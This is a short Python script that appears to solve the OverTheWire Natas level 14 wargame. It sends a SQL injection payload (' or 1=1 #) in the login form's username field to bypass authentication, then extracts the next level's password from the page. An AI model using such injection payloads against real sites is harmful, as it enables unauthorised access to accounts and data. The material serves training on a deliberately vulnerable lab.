import requests
from requests.auth import HTTPBasicAuth
import natas13solution

auth = HTTPBasicAuth('natas14', natas13solution.get_pass())
def get_pass():
    dat = {'username':'a " or 1=1 #','password':'','submit':'Login'}
            
    r = requests.post('http://natas14.natas.labs.overthewire.org/', auth=auth,data=dat)
    webcontent = r.text
  #  print(webcontent)
    i = webcontent.find('natas15 is')+11
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
